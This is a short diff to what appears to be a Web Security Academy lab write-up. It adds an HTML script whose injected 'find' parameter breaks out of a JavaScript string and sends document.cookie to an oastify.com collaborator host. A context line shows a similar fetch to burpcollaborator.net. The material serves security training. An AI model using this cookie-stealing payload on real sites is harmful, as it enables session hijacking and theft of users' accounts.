@@ -22,6 +22,12 @@ fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,bo
 </html>
 ```
 
+```html
+<script>
+location = "https://0a1f000c04e2e138809817e400f500f4.web-security-academy.net/?find=%22};%20location=%22https://unldpxs9hvs02jp2nuyjvgogq7wyk38s.oastify.com/?%22%2bdocument.cookie;%20//";
+</script>
+```
+
 
 >Steal Cookies Exploit Server:  
 
